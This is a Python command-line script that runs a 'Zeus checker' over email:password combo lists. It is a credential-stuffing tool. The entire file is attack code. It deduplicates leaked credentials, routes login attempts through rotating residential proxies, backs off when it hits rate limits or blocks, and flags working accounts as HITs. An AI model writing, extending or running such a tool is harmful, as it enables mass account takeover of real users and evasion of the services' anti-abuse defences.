#!/usr/bin/env python3
"""Run Zeus checker against VS combo lists with configurable proxy."""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

from zeus.checker import ZeusChecker, parse_combo
from zeus.proxy import parse_proxy


def load_combos(path: Path, start_line: int = 1, limit: int | None = None) -> list[tuple[str, str]]:
    combos: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    with path.open(encoding="utf-8", errors="ignore") as handle:
        for line_no, line in enumerate(handle, 1):
            if line_no < start_line:
                continue
            if limit is not None and len(combos) >= limit:
                break
            parsed = parse_combo(line.split("|", 1)[0])
            if not parsed:
                continue
            email, password = parsed
            key = (email.lower(), password)
            if key in seen:
                continue
            seen.add(key)
            combos.append((email, password))
    return combos


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run Zeus checker on a VS combo file")
    parser.add_argument("combo_file", help="Path to email:password combo file")
    parser.add_argument("--proxy", help="host:port:user:pass or http://user:pass@host:port")
    parser.add_argument("--start-line", type=int, default=1, help="1-based line to start from")
    parser.add_argument("--limit", type=int, help="Max combos to check")
    parser.add_argument("--timeout", type=float, default=60.0)
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between checks (seconds)")
    parser.add_argument("--rotate-proxy", action="store_true", help="Rotate resi session per check")
    parser.add_argument("--stop-on", choices=["hit", "valid", "none"], default="valid",
                        help="Stop on HIT, HIT/FAIL (valid), or run all")
    args = parser.parse_args(argv)

    path = Path(args.combo_file)
    if not path.is_file():
        print(f"Combo file not found: {path}", file=sys.stderr)
        return 1

    proxy = parse_proxy(args.proxy) if args.proxy else None
    combos = load_combos(path, start_line=args.start_line, limit=args.limit)
    if not combos:
        print("No combos to run", file=sys.stderr)
        return 1

    print(f"Loaded {len(combos):,} combos from {path.name} (start line {args.start_line:,})")
    if proxy:
        print(f"Proxy: {proxy.split('@')[-1]} (rotate={args.rotate_proxy})")
    print()

    checker = ZeusChecker(timeout=args.timeout)
    hits = 0
    fails = 0
    for i, (email, password) in enumerate(combos, 1):
        result = checker.check(
            email,
            password,
            proxy=proxy,
            rotate_proxy=args.rotate_proxy,
        )
        line = result.format_line()
        if result.status in ("HIT", "FAIL", "ERROR") or i % 100 == 0:
            print(f"[{i}/{len(combos)}] {line}")

        if result.status == "HIT":
            hits += 1
            if args.stop_on in ("hit", "valid"):
                print(f"\n>>> HIT at #{i} <<<")
                break
        elif result.status == "FAIL":
            fails += 1
            if args.stop_on == "valid":
                print(f"\n>>> VALID LOGIN (inactive) at #{i} <<<")
                break
        elif result.status == "ERROR" and result.error and ("429" in result.error or "Blocked" in result.error):
            time.sleep(3)

        time.sleep(args.delay)

    print(f"\nDone — HITs: {hits}, valid/inactive: {fails}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
